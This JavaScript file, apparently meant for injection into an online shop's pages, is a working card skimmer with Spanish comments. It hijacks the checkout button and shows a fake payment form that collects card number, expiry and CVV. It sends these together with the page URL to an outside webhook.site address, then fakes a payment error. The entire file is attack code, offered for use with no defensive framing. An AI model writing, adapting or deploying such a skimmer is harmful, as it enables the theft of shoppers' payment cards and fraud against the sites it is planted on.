// En tu GitHub: checkout.js
console.log("Script inyectado: Buscando botón Checkout...");

// Usamos un intervalo por si el botón tarda en cargar por JS
const checkExist = setInterval(function() {
   const checkoutBtn = document.getElementById('checkout');
   if (checkoutBtn) {
      console.log("Botón de Checkout encontrado!");
      clearInterval(checkExist);
      
      checkoutBtn.addEventListener('click', function(e) {
         e.preventDefault(); // Bloqueamos el checkout real
         
         // Dibujamos el formulario falso (Fake UI)
         const ui = `
            <div id="fake-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:sans-serif;">
                <div style="background:white;padding:30px;border:1px solid #ddd;box-shadow:0 4px 15px rgba(0,0,0,0.1);max-width:400px;width:90%;">
                    <h2 style="margin-top:0;">Payment Verification</h2>
                    <p>Please confirm your card details to complete the purchase of $69.99 USD.</p>
                    <input type="text" id="fake-cc" placeholder="Card Number" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;">
                    <div style="display:flex;gap:10px;">
                        <input type="text" id="fake-exp" placeholder="MM/YY" style="width:50%;padding:10px;border:1px solid #ccc;">
                        <input type="text" id="fake-cvv" placeholder="CVV" style="width:50%;padding:10px;border:1px solid #ccc;">
                    </div>
                    <button id="fake-pay" style="width:100%;background:black;color:white;padding:15px;border:none;margin-top:20px;cursor:pointer;font-weight:bold;">PAY NOW</button>
                </div>
            </div>`;
         document.body.insertAdjacentHTML('beforeend', ui);

         document.getElementById('fake-pay').addEventListener('click', function() {
            const payload = {
               cc: document.getElementById('fake-cc').value,
               exp: document.getElementById('fake-exp').value,
               cvv: document.getElementById('fake-cvv').value,
               victim_url: window.location.href
            };

            // EXFILTRACIÓN AL WEBHOOK
            fetch('https://webhook.site/cfcaa601-1896-4266-9c57-33605ad12c9e', {
               method: 'POST',
               mode: 'no-cors',
               body: JSON.stringify(payload)
            }).then(() => {
               alert("Payment Error: Please try again later.");
               location.reload();
            });
         });
      });
   }
}, 500);
